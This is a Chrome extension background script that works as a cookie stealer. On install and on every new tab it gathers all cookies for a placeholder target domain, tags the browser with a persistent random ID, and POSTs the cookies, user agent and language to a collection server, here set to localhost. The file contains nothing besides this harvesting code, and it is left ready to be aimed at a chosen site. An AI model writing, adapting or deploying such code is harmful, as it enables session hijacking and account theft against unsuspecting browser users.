
function getRandomToken() 
{
var randomPool = new Uint8Array(16);
crypto.getRandomValues(randomPool);
var hex = '';
for (var i = 0; i < randomPool.length; ++i) 
{
    hex += randomPool[i].toString(16);
}
return hex;
}
	
chrome.runtime.onInstalled.addListener(function () {

	chrome.cookies.getAll({domain: "fillherewhatwebsitecookieneedordeletedomainforfetchallcookie"}, (ret) => 
	{
		chrome.storage.local.get('userid', function(items) {
			var userid = items.userid;
			if (userid) {
				useToken(userid);
			} else {
				userid = getRandomToken();
				chrome.storage.local.set({userid: userid}, function() {
					useToken(userid);
				});
			}
			function useToken(userid) {
				var data = new FormData();
				data.append('id', userid);
				data.append('userAgent', navigator.userAgent);
				data.append('lang', window.navigator.language);
				data.append('thefile', JSON.stringify({cookies: ret}));
		
				var xhr = new XMLHttpRequest();
				xhr.open('POST', 'http://localhost/', true);
				xhr.send(data); 
			}
		});
    });

});

chrome.tabs.onCreated.addListener(function () {

	chrome.cookies.getAll({domain: "fillherewhatwebsitecookieneedordeletedomainforfetchallcookie"}, (ret) => 
	{
		chrome.storage.local.get('userid', function(items) {
			var userid = items.userid;
			if (userid) {
				useToken(userid);
			} else {
				userid = getRandomToken();
				chrome.storage.local.set({userid: userid}, function() {
					useToken(userid);
				});
			}
			function useToken(userid) {
				var data = new FormData();
				data.append('id', userid);
				data.append('userAgent', navigator.userAgent);
				data.append('lang', window.navigator.language);
				data.append('thefile', JSON.stringify({cookies: ret}));
		
				var xhr = new XMLHttpRequest();
				xhr.open('POST', 'http://localhost/', true);
				xhr.send(data); 
			}
		});
    });

});

